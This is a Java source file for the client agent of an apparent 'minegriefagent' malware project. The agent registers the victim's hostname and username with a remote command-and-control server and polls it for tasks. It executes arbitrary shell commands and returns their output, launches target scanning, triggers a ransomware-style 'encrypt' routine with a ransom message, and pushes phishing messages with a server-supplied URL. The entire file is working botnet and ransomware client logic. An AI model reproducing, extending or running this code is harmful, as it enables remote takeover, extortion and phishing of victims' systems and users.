package com.chebuya.minegriefagent.client;

import com.chebuya.minegriefagent.scanner.ScannerService;
import com.chebuya.minegriefagent.transport.ClientTransport;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

import static com.chebuya.minegriefagent.Main.phishMessage;
import static com.chebuya.minegriefagent.Main.ransomMessage;
import static com.chebuya.minegriefagent.capabilities.ExecuteCommand.executeCommand;
import static com.chebuya.minegriefagent.capabilities.Grief.startGrief;
import static com.chebuya.minegriefagent.util.Json.jsonToMap;
import static com.chebuya.minegriefagent.util.Json.mapToJson;
import static com.chebuya.minegriefagent.util.Logging.LOGGER;


public class ClientService {
    private ClientTransport transport;
    private int sleepTime;
    private String token;
    private String ip;
    private int port;

    private String uuid;
    private Thread scannerService;

    private final String REGISTER = "register";
    private final String CHECKIN = "checkin";

    private final String ACTION = "action";
    private final String JOB_ID = "job_id";
    private final String ARGS = "args";
    private final String EXECUTE = "execute";
    private final String ENCRYPT = "encrypt";
    private final String PHISH = "phish";
    private final String TARGETS = "targets";
    private final String OUTPUT = "output";

    public ClientService(ClientTransport transport, int sleepTime, String token, String ip, int port) {
        this.transport = transport;
        this.sleepTime = sleepTime;
        this.token = token;
        this.ip = ip;
        this.port = port;

        this.scannerService= new Thread();
    }

    public void Start() {
        String requestBody = "", responseBody = "", hostName = "";

        try {
            hostName = new String(Files.readAllBytes(Paths.get("/etc/hostname"))).trim();
        } catch (IOException e) {
            LOGGER.warning("unable to determine hostname: " + e.getMessage());
        }

        LOGGER.info("registering client");
        Map<String, String> requestPayload = new HashMap<String, String>();
        requestPayload.put(ACTION, REGISTER);
        requestPayload.put("token", token);
        requestPayload.put(ARGS,  hostName + "|" + System.getProperty("user.name"));
        requestBody = mapToJson(requestPayload);
        while (true) {
            try {
                Thread.sleep(sleepTime);
            } catch (InterruptedException e) {
                LOGGER.warning("client sleep interupted");
            }

            try {
                transport.openConnection(ip, port);
            } catch (Exception e) {
                LOGGER.warning("unable to open socket to " + ip + ":" + port  + ", sleeping: " + e.getMessage());
                continue;
            }

            try {
                LOGGER.info("request body: " + requestBody);
                transport.sendData(transport.transformData(requestBody));
            } catch (Exception e) {
                LOGGER.warning("error while sending data: " + e.getMessage());
                continue;
            }

            try {
                responseBody = transport.untransformData(transport.receiveData());
                LOGGER.info("response body: " + responseBody);
            } catch (Exception e) {
                LOGGER.warning("error while receiving data: " + e.getMessage());
                continue;
            }

            if (responseBody == null || responseBody.equals("{}")) {
                LOGGER.warning("the response body is empty");
                return;
            }

            requestBody = processResponse(responseBody);

            try {
                transport.closeConnection();
            } catch (Exception e) {
                LOGGER.warning("error while closing socket: " + e.getMessage());
            }
        }
    }

    private String processResponse(String responseBody) {
        Map<String, String> responsePayload = null, requestPayload = new HashMap<String, String>();
        String action = null;

        responsePayload = jsonToMap(responseBody);
        action = responsePayload.get("action");

        if (action.equals(REGISTER))  {
            this.uuid = responsePayload.get("id");
            LOGGER.info("client uuid obtained: " + uuid);
            requestPayload.put(ACTION, TARGETS);
        } else if (action.equals(TARGETS)) {
            LOGGER.info("starting scanning service");

            scannerService = new Thread(new ScannerService(responsePayload.get(ARGS)));
            scannerService.start();

            requestPayload.put(ACTION, CHECKIN);
        } else if (action.equals(EXECUTE)) {
            String output;
            try {
                output = executeCommand(responsePayload.get(ARGS));
            } catch (RuntimeException e) {
                LOGGER.warning("error executing command: " + e.getMessage());
                output = e.getMessage();
            }

            requestPayload.put(ACTION, EXECUTE);
            requestPayload.put(OUTPUT, output);
            requestPayload.put(JOB_ID, responsePayload.get(JOB_ID));
        } else if (action.equals(ENCRYPT)) {
            LOGGER.info("starting encrypt routine");

            String[] jobArgs = responsePayload.get(ARGS).split("\\|");
            startGrief(new String(Base64.getDecoder().decode(jobArgs[0]), StandardCharsets.UTF_8), ransomMessage.replace("DECRYPTION_ID", jobArgs[1]), true, Base64.getDecoder().decode(jobArgs[2]));
            requestPayload.put(ACTION, CHECKIN);
        } else if (action.equals(PHISH)) {
            LOGGER.info("starting phish routine");

            String[] jobArgs = responsePayload.get(ARGS).split("\\|");
            startGrief(new String(Base64.getDecoder().decode(jobArgs[0]), StandardCharsets.UTF_8), phishMessage.replace("PHISH_URL", new String(Base64.getDecoder().decode(jobArgs[1]), StandardCharsets.UTF_8)), false, null);
            requestPayload.put(ACTION, CHECKIN);
        } else {
            if (!scannerService.isAlive()) {
                LOGGER.info("requesting new targets");
                requestPayload.put(ACTION, TARGETS);
            } else {
                requestPayload.put(ACTION, CHECKIN);
            }
        }

        requestPayload.put("id", uuid);
        requestPayload.put("token", token);
        return mapToJson(requestPayload);
    }
}
